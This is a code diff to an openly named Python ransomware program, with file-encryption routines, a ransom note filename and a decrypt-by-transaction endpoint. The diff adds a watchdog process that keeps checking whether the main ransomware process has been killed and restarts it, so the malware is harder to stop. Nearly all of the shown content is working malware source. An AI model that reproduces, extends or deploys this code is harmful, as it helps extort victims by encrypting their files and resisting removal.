@@ -1,12 +1,14 @@
 import os
 import http_requests
-
+import ctypes
 import aes_cipher
 import rsa_cipher
 import shutil
-
+import psutil
 from fastapi import FastAPI
 import uvicorn
+import multiprocessing
+
 
 EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
 ENCRYPTED_FILE_TAG = 'ransom_encrypted'
@@ -20,6 +22,7 @@ app = FastAPI()
 
 @app.on_event('startup')
 async def startup():
+    
     await main()
 
 @app.get("/attempt_decrypt/{transaction_id}")
@@ -152,7 +155,25 @@ async def get_server_public_key(file_name):
 
     return 0
 
+def watchdog(selected_pid):
+    import time
+    
 
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_watchdog_pid", 1)
+    print(f'ransomware watchdog pid: {str(os.getpid())}')
+    while True:
+        time.sleep(5)
+        #print(selected_pid)
+        if not psutil.pid_exists(selected_pid):
+            p = multiprocessing.Process(target=main_helper, args=())
+            p.start()
+            selected_pid = p.pid
+            print(f'ransomware main pid: {str(selected_pid)}')
+    
+def set_watchdog():
+    pid_main = os.getpid()
+    p = multiprocessing.Process(target=watchdog, args=(pid_main,))
+    p.start()
 
 
 
@@ -169,7 +190,16 @@ async def main():
 
     print('Successully encrypted files')
  
+      
+
+
+def main_helper():
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_pid", 1)
+    print(f'ransomware main pid: {str(os.getpid())}')
+    uvicorn.run("main:app", port=8074, host='127.0.0.1')
 
 if __name__ == "__main__":
     #uvicorn.run(app, host="127.0.0.1", port=)
+    set_watchdog()
+    main_helper()
     uvicorn.run("main:app", port=8074, host='127.0.0.1')
